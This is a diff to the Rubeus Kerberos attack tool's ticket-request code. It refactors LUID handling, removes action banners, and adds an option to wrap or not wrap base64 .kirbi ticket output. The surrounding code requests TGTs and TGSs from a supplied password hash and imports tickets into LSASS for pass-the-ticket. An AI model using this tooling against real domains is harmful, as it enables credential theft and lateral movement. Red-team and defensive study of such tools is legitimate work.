@@ -2,6 +2,8 @@
 using System.IO;
 using System.Linq;
 using Asn1;
+using Rubeus.lib.Interop;
+
 
 namespace Rubeus
 {
@@ -27,7 +29,7 @@ namespace Rubeus
 
     public class Ask
     {
-        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", Interop.LUID luid = new Interop.LUID(), bool describe = false)
+        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false)
         {
             try
             {
@@ -46,12 +48,10 @@ namespace Rubeus
             return null;
         }
 
-        public static byte[] InnerTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", Interop.LUID luid = new Interop.LUID(), bool describe = false, bool verbose = false)
+        public static byte[] InnerTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false)
         {
             if (verbose)
             {
-                Console.WriteLine("[*] Action: Ask TGT\r\n");
-
                 Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);
 
                 if ((ulong)luid != 0)
@@ -187,10 +187,17 @@ namespace Rubeus
 
                     Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
 
-                    // display the .kirbi base64, columns of 80 chararacters
-                    foreach (string line in Helpers.Split(kirbiString, 80))
+                    if (Rubeus.Program.wrapTickets)
                     {
-                        Console.WriteLine("      {0}", line);
+                        // display the .kirbi base64, columns of 80 chararacters
+                        foreach (string line in Helpers.Split(kirbiString, 80))
+                        {
+                            Console.WriteLine("      {0}", line);
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("      {0}", kirbiString);
                     }
                 }
 
@@ -261,11 +268,6 @@ namespace Rubeus
 
         public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true)
         {
-            if (display)
-            {
-                Console.WriteLine("[*] Action: Ask TGS\r\n");
-            }
-
             string dcIP = Networking.GetDCIP(domainController, display);
             if (String.IsNullOrEmpty(dcIP)) { return null; }
 
@@ -365,17 +367,24 @@ namespace Rubeus
                 if (ptt)
                 {
                     // pass-the-ticket -> import into LSASS
-                    LSA.ImportTicket(kirbiBytes, new Interop.LUID());
+                    LSA.ImportTicket(kirbiBytes, new LUID());
                 }
 
                 if (display)
                 {
                     Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
 
-                    // display the .kirbi base64, columns of 80 chararacters
-                    foreach (string line in Helpers.Split(kirbiString, 80))
+                    if (Rubeus.Program.wrapTickets)
                     {
-                        Console.WriteLine("      {0}", line);
+                        // display the .kirbi base64, columns of 80 chararacters
+                        foreach (string line in Helpers.Split(kirbiString, 80))
+                        {
+                            Console.WriteLine("      {0}", line);
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("      {0}", kirbiString);
                     }
 
                     KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
